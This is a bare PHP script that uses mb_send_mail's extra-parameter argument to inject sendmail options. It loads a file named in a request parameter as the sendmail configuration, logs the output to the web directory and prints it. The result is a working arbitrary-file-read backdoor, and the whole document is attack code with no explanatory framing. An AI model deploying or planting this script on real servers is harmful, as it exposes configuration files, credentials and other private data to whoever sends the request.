<?php
if (isset($_REQUEST['file'])) {
$file = "sendlog";
if (file_exists($file)) unlink($file);
$extra = "-C ".$_REQUEST['file']." -X ".getcwd()."/".$file;
mb_send_mail(NULL, NULL, NULL, NULL, $extra);
echo "<pre>".file_get_contents($file)."</pre>";
}
?>